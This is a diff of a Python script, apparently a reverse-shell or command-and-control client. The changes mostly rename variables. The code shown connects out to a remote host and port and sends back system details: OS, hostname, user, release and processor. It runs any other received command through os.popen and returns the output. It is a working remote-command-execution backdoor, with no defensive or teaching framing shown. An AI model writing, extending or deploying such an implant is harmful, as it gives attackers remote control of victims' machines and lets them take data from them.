@@ -34,7 +34,6 @@ try:
     RHOST = str(sys.argv[1])
     RPORT = int(sys.argv[2])
 except:
-    #sys.exit(1)
     RHOST = '127.0.0.1'
     RPORT = 7261
 
@@ -55,29 +54,29 @@ def decode(base64_message):
 def main():
 
     try:
-        s = socket.socket()
-        s.connect((RHOST, RPORT))
+        tcp_socket = socket.socket()
+        tcp_socket.connect((RHOST, RPORT))
     except:
         sys.exit(1)
 
     while True:
-        data = s.recv(1024)
-        cmd = decode(data)
+        data = tcp_socket.recv(1024)
+        command = decode(data)
 
         # stop client
-        if cmd == 'quit':
-            s.close()
+        if command == 'quit':
+            tcp_socket.close()
             sys.exit(0)
         # client_discovery
-        elif cmd == 'client_discovery':
+        elif command == 'client_discovery':
             results = '{}|{}|{}|{}|{}'.format(platform.system(),
                 platform.node(),getpass.getuser(),platform.release(),
                 platform.processor())
-            s.sendall(encode(results))
+            tcp_socket.sendall(encode(results))
         # any other command
         else:
-            results = os.popen(cmd).read()
-            s.sendall(encode(results))
+            results = os.popen(command).read()
+            tcp_socket.sendall(encode(results))
             
 if __name__ == '__main__':
     main()
